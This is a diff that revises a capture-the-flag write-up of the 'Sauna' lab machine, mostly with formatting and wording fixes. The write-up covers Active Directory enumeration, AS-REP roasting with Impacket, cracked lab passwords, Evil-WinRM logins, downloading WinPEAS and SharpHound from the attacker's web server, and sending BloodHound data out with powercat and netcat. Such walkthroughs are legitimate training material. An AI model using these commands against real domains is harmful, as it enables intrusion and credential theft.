@@ -25,7 +25,7 @@ Writeup: 31 May 2020
 * * *
 ## 2- Enumeration
 ### 2.1- Nmap Scan
-First things first, we begin with a `nmap` scan:
+First things first, we begin with a **`nmap`** scan:
 ~~~
 root@kali:~# nmap --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.175
 
@@ -114,9 +114,9 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Sat May 23 17:54:40 2020 -- 1 IP address (1 host up) scanned in 782.01 seconds
 ~~~
 
-The important services we found here are : HTTP, DNS, RPC, SMB, Kerberos, and LDAP.
-There is obviously an Active Directory about which we already have some information: the box is **SAUNA** and its domain name is probably **EGOTISTICAL-BANK.LOCAL**.
-There is also a web site named "Egotistical Bank :: Home" installed on a Microsoft-IIS 10.0 web server.
+The important services we found here are : HTTP, DNS, RPC, SMB, Kerberos, and LDAP.   
+There is obviously an Active Directory about which we already have some information: the box is **SAUNA** and its domain name is probably **EGOTISTICAL-BANK.LOCAL**.   
+There is also a web site named "Egotistical Bank :: Home" installed on a Microsoft-IIS 10.0 web server.   
 
 
 
@@ -129,7 +129,7 @@ Going to the url [http://10.10.10.175](http://10.10.10.175), we arrive on the fo
 
 ![site](images/site.png "site")
 
-If we run **`gobuster`** with `gobuster dir -u http://10.10.10.175:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -z -k -l -x "txt,html,php,asp,aspx,jsp"`, we obtain the following result:
+Running **`gobuster`** with `# gobuster dir -u http://10.10.10.175:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -z -k -l -x "txt,html,php,asp,aspx,jsp"`, we obtain the following result:
 
 ~~~
 /About.html (Status: 200) [Size: 30954]
@@ -187,7 +187,7 @@ result: 0 Success
 
 Let's try to find more information about users if we can...
 
-If we try with **`enum4linux`**, we don't find more information about users. Another idea is to try **`[Impacket](https://github.com/SecureAuthCorp/impacket)`** using **`GetADUsers.py`** against users but don't find antyhin more here:
+If we try with **`enum4linux`**, we don't find more information about users. Another idea is to try **[Impacket](https://github.com/SecureAuthCorp/impacket)** using **`GetADUsers.py`** against users but don't find antyhing more here:
 
 ~~~
 root@kali:~# GetADUsers.py -all -no-pass -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/
@@ -206,7 +206,7 @@ However, there is a page on the site with some members of the team:
 - Sophie Driver
 - Steven Kerb
 
-There are many naming convention the Egotistical Bank may use for its Active Directory but the most commonly used is the first letter of the firstname folled by the name. Let's build a simple user list and write it down in a file "users.txt":
+There are many naming convention the Egotistical Bank may use for its Active Directory, but the most commonly used is the first letter of the firstname followed by the name. And we can assume the people on the site page are active employees of Egotistical Bank. Now, let's build a simple users list writing down the account logins we can guess based on the usual naming convention:
 
 ~~~
 root@kali:~# cat users.txt 
@@ -220,9 +220,9 @@ skerb
 
 Please note that we could try several naming conventions. 
 
-Now, a lot of tools from **`[Impacket](https://github.com/SecureAuthCorp/impacket)`** can be helpful. You will find more information about its tools here : [Impacket tools](https://www.secureauth.com/labs/open-source-tools/impacket).
+Now, a lot of tools from **[Impacket](https://github.com/SecureAuthCorp/impacket)** can be helpful. You will find more information about its tools here : [Impacket tools](https://www.secureauth.com/labs/open-source-tools/impacket).
 
-You can also have a look at what we have:
+You can also have a look at what we have. Each python script in **`Impacket`** includes a description:
 ~~~
 root@kali:~# ls /usr/share/doc/python3-impacket/examples/
 addcomputer.py     getTGT.py         netview.py            reg.py          sniff.py
@@ -253,7 +253,7 @@ root@kali:~# less /usr/share/doc/python3-impacket/examples/GetNPUsers.py
 #    'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH).
 #    For those users with such configuration, a John The Ripper output will be generated so
 #    you can send it for cracking.
-
+(...)
 ~~~
 
 In our case, we may want to try this GetNPUsers.py. Very often, Kerberos preauthenticatiion is not set for some sers and in such a case, we will be able to get a TGT (Ticket Granting Ticket) hash which we may crack to get user's password:
@@ -293,30 +293,8 @@ $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:499b(...)640e6809:Thestrokes23
 We just found the password: **Thestrokes23**.    
 So we have the creds **fsmith:Thestrokes23**
 
-~~~
-root@kali:~# evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
+We can login using Evil-WinRM: **`root@kali:~# evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23`**
 
-Evil-WinRM shell v2.3
-
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..
-*Evil-WinRM* PS C:\Users\FSmith> cd desktop
-*Evil-WinRM* PS C:\Users\FSmith\desktop> dir
-
-
-    Directory: C:\Users\FSmith\desktop
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--a----        1/23/2020  10:03 AM             34 user.txt
-
-
-*Evil-WinRM* PS C:\Users\FSmith\desktop> type user.txt
-1b5520b98d97cf17f24122a55baf70cf
-*Evil-WinRM* PS C:\Users\FSmith\desktop> 
-~~~
 
 ![user-txt](images/user-txt.png "user-txt")
 
@@ -373,13 +351,16 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 ~~~
 
+Let's get a broader enumeration using tools such as **`WinPEAS`** and **`BloodHound`**.   
+[**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) is a well known anumeration tool.   
+[**BloodHound**](https://github.com/BloodHoundAD/BloodHound) BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment.
 
 We set up a web server on our kali machine:
 ~~~
 root@kali:/ftphome# python3 -m http.server 80
 ~~~
 
-And download WinPEAS and SharpHound (that will allow us to gather informations on the AD and how to escalate privileges).
+And download **`WinPEAS`** and **`SharpHound`** (which is the BloodHound ingestor that gather informations on the AD):
 ~~~
 *Evil-WinRM* PS C:\Users\FSmith\temp> iwr http://10.10.14.23/winpeas64.exe -o winp.exe
 *Evil-WinRM* PS C:\Users\FSmith\temp> iwr http://10.10.14.23/sharphound.exe -o sharp.exe
@@ -392,9 +373,9 @@ When running winPEAS, we notice the following account with the password **Moneym
 
 As this is a service account , it may also be a member of high value groups. When an application is executed, it must always do so in the context of an operating system user. If a user launches an application, that user account defines the context. However, services launched by the system itself use the context based on a Service Account.    
 
-This service account could allow to execute various privileges escalation techniques and that's why we should try to login with it and launch sharphound to collect the information on the AD.
+This service account could allow to execute various privileges escalation techniques and that's why we should try to login with it and launch **`SharpHound`** to collect the information on the AD.
 
-It does not work with to login whe account “svc_loanmanager”:
+Login with the account “svc_loanmanager” does not work:
 ~~~
 root@kali:~# evil-winrm -i 10.10.10.175 -u svc_loanmanager -p Moneymakestheworldgoround!
 Evil-WinRM shell v2.3
@@ -403,13 +384,14 @@ Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinR
 Error: Exiting with code 1
 ~~~
 
-But we noticed in WinPEAS results that its home directory is named "svc_loanmgr":
+But we noticed in WinPEAS results that its home directory is named "svc_loanmgr", so let's try the account **"svc_loanmgr"** instead:
 ~~~
 root@kali:~# evil-winrm -i 10.10.10.175 -u svc_loanmgr -p Moneymakestheworldgoround!
 Evil-WinRM shell v2.3
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>
 ~~~
+
 it works ! We have a valid creds for another account:   
 **svc_loanmgr:Moneymakestheworldgoround!**
 
@@ -417,7 +399,7 @@ it works ! We have a valid creds for another account:
 
 ### 3.2- New Account Enumeration
 
-We execute SharpHound :
+We can execute SharpHound:
 ~~~
 *Evil-WinRM* PS C:\Users\All USers\temp> . .\sharp.ps1
 *Evil-WinRM* PS C:\Users\All USers\temp> Invoke-BloodHound -CollectionMethod All 
@@ -434,7 +416,7 @@ Mode                LastWriteTime         Length Name
 ~~~
 
 
-Now we want to transfer the file “20200524170226_BloodHound.zip” back to our kali machine. We download **`Powercat`** and load the script :
+Now, we want to transfer the file “20200524170226_BloodHound.zip” back to our kali machine. We download **`Powercat`** and load the script :
 ~~~
 *Evil-WinRM* PS C:\Users\All USers\temp> iwr http://10.10.14.23/powercat.ps1 -o pwr.ps1
 *Evil-WinRM* PS C:\Users\All USers\temp> . .\pwr.ps1
@@ -450,8 +432,6 @@ root@kali:~# nc -nlvp 4444 > bloohound.zip
 
 
 Trying the request “Shortest Paths to Domain Admins from Owned Principals”, we actually find nothing valuable:
-
-![bh-queries](images/bh-queries.png "bh-queries")
 
 ![nodata](images/nodata.png "nodata")
 
